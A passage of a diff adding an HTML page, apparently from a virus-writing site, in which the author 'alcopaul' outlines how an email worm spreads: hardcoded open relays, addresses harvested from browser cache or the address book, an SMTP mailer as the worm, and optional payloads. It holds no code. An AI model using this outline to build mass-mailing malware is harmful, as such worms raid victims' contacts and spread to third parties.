+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>i'm just gonna repeat myself this time..</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>essentials for a smtp spreading :</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>mailserver (open relays should be hardcoded just incase infos from registry can't be found)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>email addresses (collect from Temp Internet Files folder or WAB)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>smtp mailer (which is the worm itself)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>if you wanna put some payloads, do it..</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#DDDDDD" FACE="Arial,Helvetica,sans-serif"><B>alcopaul</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+</Td>
+<Td ALIGN="LEFT" WIDTH="10" VALIGN = "top" ><IMG BORDER="0" SRC="1x1.gif" HEIGHT="1" ALIGN="bottom" WIDTH="10" HSPACE="0" VSPACE="0"></Td>
+ </Tr>
+ <Tr>
+  <Td WIDTH="10" HEIGHT="1"></Td>  <Td><FONT SIZE="1"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</FONT></Td>  <Td WIDTH="10" ></Td>
+ </Tr>
+</TABLE>
+</BODY>
+</HTML>
